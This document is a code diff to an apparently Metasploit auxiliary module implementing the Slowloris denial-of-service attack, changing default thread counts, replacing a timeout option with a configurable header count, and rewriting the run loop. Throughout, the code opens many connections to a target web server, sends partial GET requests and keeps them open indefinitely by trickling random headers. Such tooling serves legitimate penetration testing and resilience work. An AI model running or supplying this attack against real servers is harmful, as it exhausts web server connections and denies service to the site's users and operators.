@@ -11,8 +11,8 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(
       info,
       'Name'            => 'Slow Loris DoS',
-      'Description'     => %q{Slowloris tries to keep many connections to the target web server open and hold them open as long as possible.
-                              It accomplishes this by opening connections to the target web server and sending a partial request.
+      'Description'     => %q{Slowloris tries to keep many connections to the target web server open and hold them open as long as possible. 
+                              It accomplishes this by opening connections to the target web server and sending a partial request. 
                               Periodically, it will send subsequent requests, adding to but never completing the request.},
       'License'         => MSF_LICENSE,
       'Author'          =>
@@ -31,8 +31,8 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(80),
-        OptInt.new('THREADS', [true, 'The number of concurrent threads', 5000]),
-        OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 60])
+        OptInt.new('THREADS', [true, 'The number of concurrent threads', 1000]),
+        OptInt.new('HEADERS', [true, 'The number of custom headers sent by each thread', 10])
       ])
   end
 
@@ -40,25 +40,24 @@ class MetasploitModule < Msf::Auxiliary
     datastore['THREADS']
   end
 
-  def timeout
-    datastore['TIMEOUT']
+  def headers
+    datastore['HEADERS']
   end
 
   def run
       starting_thread = 1
       header = "GET / HTTP/1.1\r\n"
       threads = []
-      while true do
-
-        ubound = [thread_count].min
-        print_status("Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...")
-
-        1.upto(ubound) do |i|
+    
+      loop do
+        print_status("Executing requests #{starting_thread} - #{(starting_thread + [thread_count].min) - 1}...")
+        
+        1.upto([thread_count].min) do |i|
           threads << framework.threads.spawn("Module(#{self.refname})-request#{(starting_thread - 1) + i}", false, i) do |i|
             begin
               connect()
               sock.puts(header)
-              10.times do
+              headers.times do
                 data = "X-a-#{rand(0..1000)}: b\r\n"
                 sock.puts(data)
                 sleep rand(1..15)
@@ -67,7 +66,7 @@ class MetasploitModule < Msf::Auxiliary
           end
         end
         threads.each(&:join)
-        starting_thread += ubound
+        starting_thread += [thread_count].min
       end
   end
 end
